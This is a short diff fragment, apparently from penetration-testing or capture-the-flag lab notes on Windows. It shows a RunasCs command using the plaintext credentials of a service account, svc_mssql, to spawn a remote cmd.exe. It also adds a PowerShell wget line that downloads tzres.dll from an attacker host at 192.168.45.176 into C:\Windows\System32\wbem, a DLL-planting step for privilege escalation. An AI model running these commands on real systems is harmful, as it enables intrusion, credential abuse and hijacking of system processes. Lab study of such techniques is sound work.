@@ -5,7 +5,7 @@ Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 1
 ```
 
 ```
-
+powershell wget http://192.168.45.176:80/tzres.dll C:\Windows\System32\wbem\tzres.dll
 ```
 
 ```
